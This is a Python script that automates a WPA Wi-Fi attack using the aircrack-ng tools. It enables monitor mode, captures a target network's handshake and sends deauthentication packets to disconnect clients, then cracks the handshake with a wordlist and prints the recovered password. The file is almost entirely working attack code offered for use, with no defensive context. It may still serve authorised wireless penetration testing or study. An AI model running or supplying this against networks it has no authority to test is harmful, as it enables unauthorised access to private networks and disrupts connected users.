import subprocess
import re
import os

# Start monitor mode on the specified interface
def start_monitor_mode(interface):
    """Enable monitor mode on the given wireless interface."""
    try:
        subprocess.run(["airmon-ng", "start", interface], check=True)
        print(f"[+] Monitor mode enabled on {interface}")
        return f"{interface}mon"  # Return the monitor interface name
    except subprocess.CalledProcessError:
        print(f"[-] Failed to enable monitor mode on {interface}")
        return None

# Stop monitor mode on the specified interface
def stop_monitor_mode(interface):
    """Disable monitor mode on the given wireless interface."""
    try:
        subprocess.run(["airmon-ng", "stop", interface], check=True)
        print(f"[+] Monitor mode disabled on {interface}")
    except subprocess.CalledProcessError:
        print(f"[-] Failed to disable monitor mode on {interface}")

# Scan for available WiFi networks
def scan_networks(interface):
    """Scan for WiFi networks using airodump-ng."""
    try:
        print("[+] Scanning for networks... Press Ctrl+C to stop.")
        subprocess.run(["airodump-ng", interface], check=True)
    except subprocess.CalledProcessError:
        print("[-] Failed to scan networks")
    except KeyboardInterrupt:
        print("[+] Scan stopped by user")

# Capture WPA handshake for a specific network
def capture_handshake(interface, bssid, channel, output_file):
    """Capture a WPA handshake for the specified BSSID and channel."""
    try:
        print(f"[+] Starting handshake capture for BSSID: {bssid} on channel {channel}")
        # Start airodump-ng in the background to capture handshake
        proc = subprocess.Popen([
            "airodump-ng",
            "--bssid", bssid,
            "--channel", channel,
            "-w", output_file,
            interface
        ])
        return proc  # Return the process object to manage it later
    except subprocess.CalledProcessError:
        print("[-] Failed to start handshake capture")
        return None

# Perform a deauthentication attack to force a handshake
def deauth_attack(interface, bssid, client=None):
    """Perform a deauthentication attack on the target BSSID."""
    try:
        cmd = ["aireplay-ng", "--deauth", "10", "-a", bssid]
        if client:
            cmd.extend(["-c", client])  # Optional client MAC to target
        cmd.append(interface)
        print(f"[+] Sending deauth packets to {bssid}...")
        subprocess.run(cmd, check=True)
    except subprocess.CalledProcessError:
        print("[-] Deauthentication attack failed")

# Crack the WPA handshake using a wordlist
def crack_handshake(cap_file, wordlist, bssid):
    """Crack the WPA handshake using the specified capture file, wordlist, and BSSID."""
    if not os.path.exists(cap_file):
        print(f"[-] Capture file {cap_file} does not exist")
        return None
    if not os.path.exists(wordlist):
        print(f"[-] Wordlist {wordlist} does not exist")
        return None

    try:
        print(f"[+] Attempting to crack handshake for BSSID: {bssid}")
        # Run aircrack-ng with the BSSID explicitly specified
        result = subprocess.run(
            ["aircrack-ng", "-w", wordlist, "-b", bssid, cap_file],
            capture_output=True,
            text=True
        )

        # Check the output for specific conditions
        if "No authentication packet found" in result.stdout:
            print("[-] No handshake captured for this BSSID. Please capture the handshake first.")
            return None
        elif "KEY FOUND!" in result.stdout:
            # Extract the key from the output (e.g., [password])
            key = re.search(r'\[(.*?)\]', result.stdout).group(1)
            print(f"[+] Password found: {key}")
            return key
        else:
            print("[-] Password not found in wordlist")
            return None

    except subprocess.CalledProcessError:
        print("[-] Failed to run aircrack-ng")
        return None
